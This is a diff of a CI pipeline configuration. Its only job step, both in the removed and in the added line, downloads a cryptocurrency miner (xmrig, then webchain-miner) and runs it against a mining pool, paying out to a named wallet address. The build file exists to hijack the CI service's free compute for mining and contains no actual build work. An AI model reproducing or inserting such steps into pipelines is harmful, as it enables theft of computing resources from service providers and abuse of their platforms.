@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar xf xmrig-6.15.1-linux-x64.tar.gz &&cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:13333 -a rx -k -p x -t 16 -u SHIB:0x47d826d770d5926A7C00f56658b1eB7fF3A48A31.handoko0909
+      - run:  wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0xE27AE2d63023C30B894E6662267ED9824187f580 -p x
